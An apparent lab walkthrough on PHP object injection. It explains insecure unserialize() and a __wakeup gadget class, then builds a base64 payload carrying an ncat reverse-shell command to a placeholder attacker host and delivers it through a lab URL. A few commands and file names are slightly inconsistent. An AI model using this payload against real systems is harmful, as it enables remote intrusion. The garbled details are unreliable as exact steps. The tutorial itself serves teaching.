Object injection is a vulnerability that arises from insecure data deserialisation in web applications. It occurs when untrusted data is deserialised into an object, allowing attackers to manipulate the serialised data to execute arbitrary code, leading to serious security risks. In this task, we'll explore how object injection works and demonstrate its impact through a simple PHP code snippet.

As we know, the vulnerability arises from the process of serialisation and deserialisation, which allows PHP objects to be converted into a storable format (serialisation) and reconstructed back into objects (deserialisation). While serialisation and deserialisation are useful for data storage and transmission, they can also introduce security risks if not properly implemented.

To exploit a PHP Object Injection vulnerability, the application should include a class featuring a PHP magic method (like `__wakeup` or `__sleep`) that can be exploited for malicious purposes. All classes involved in the attack should be declared before calling the `unserialize()` method (unless object autoloading is supported).

## Example
Let's consider an `index.php` code snippet that shows the serialisation and deserialisation using the `serialize()` and `unserialize()` functions. The code accepts **GET** parameter **decode** or **encode** and converts the user-provided value accordingly.

```php
<?php
class UserData {
    private $data;
    public function __construct($data) {
        $this->data = $data;
    }
..
require 'test.php';

if(isset($_GET['encode'])) {
    $userData = new UserData($_GET['encode']);
    $serializedData = serialize($userData);
    $base64EncodedData = base64_encode($serializedData);
    echo "Normal Data: " . $_GET['encode'] . "<br>";
    echo "Serialized Data: " . $serializedData . "<br>";
    echo "Base64 Encoded Data: " . $base64EncodedData;

} elseif(isset($_GET['decode'])) {
    $base64EncodedData = $_GET['decode'];
    $serializedData = base64_decode($base64EncodedData);
    $test = unserialize($serializedData);
    echo "Base64 Encoded Serialized Data: " . $base64EncodedData . "<br>";
    echo "Serialized Data: " . $serializedData;

...
```

We see that the code includes a file called `test.php`. From a source code review or considering whether the framework is open source, the pentester knows that `test.php` contains a class called `MaliciousUserData` as shown below:
```php
<?php
class MaliciousUserData {
public $command = 'ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh'; // call to troubleshooting server
    
    public function __wakeup() { 
    exec($this->command);
...

?>
```

In the above code, through insecure deserialisation, it's possible to manipulate the properties of an object, including altering the `command` property of the `MaliciousUserData` class in the above code. This can be achieved by crafting a specially crafted serialised string that contains the desired property values. For instance, if we want to modify the `command` property to execute a different command or connect to a different server, we can serialise an object with the desired property value and then inject it into the vulnerable `unserialize()` function. This way, upon deserialisation, the manipulated property value will be loaded into the object.

It is important to understand that during insecure deserialisation, you can't directly update the definition of the `__wakeup` method itself. The `__wakeup` method is a part of the class definition and remains static during the deserialisation process. However, what you can do is modify the behavior or properties of the object within the `__wakeup` method. This means that while the method's definition remains constant, its actions upon deserialisation can be manipulated to achieve different outcomes.

## Payload
As discussed earlier, calling another class is a normal feature in PHP, and you can view the code of that file if the target website is using open-source code. The code in `index.php` blindly unserialises the input without performing any sanitisation. What is the option here? What if we modify the class `MaliciousUserData` and modify its `command` attribute such that when the `__wakeup` function is called, it will be called with the attacker-provided value?

Let's create some PHP code on our machine that generates malicious serialised user data.
```php
<?php
class MaliciousUserData {
public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
}

$maliciousUserData = new MaliciousUserData();
$serializedData = serialize($maliciousUserData);
$base64EncodedData = base64_encode($serializedData);
echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
?>
```

- In the above code, the `_wakeup()` function of `MaliciousUserData` class (`test.php`) will execute a reverse shell command using Ncat to connect to the specified IP address (`ATTACK_IP`) and port (`4444`) with the -e flag to execute `/bin/sh` as a shell
- Once you create the file, execute it through `php index.php` through the terminal. This will return a base64-encoded serialised object of the `MaliciousUserData` class.
- The generated base64 encoded string would look like this: `TzoxNzoiTWFsaWNp[Redacted]`.  
- Start the Netcat listener on port 4444 using the command `nc -nvlp 4444` on the AttackBox.
- Now, it's time to exploit the insecure deserialisation by decoding the shellcode by visiting the URL `http://10.10.225.40/case2/?decode=[SHELLCODE]` without generating the shellcode.  
- Once you visit the URL, the index.php file's deserialise function will deserialise the string and execute the `__wakeup()` function, leading to a remote shell.
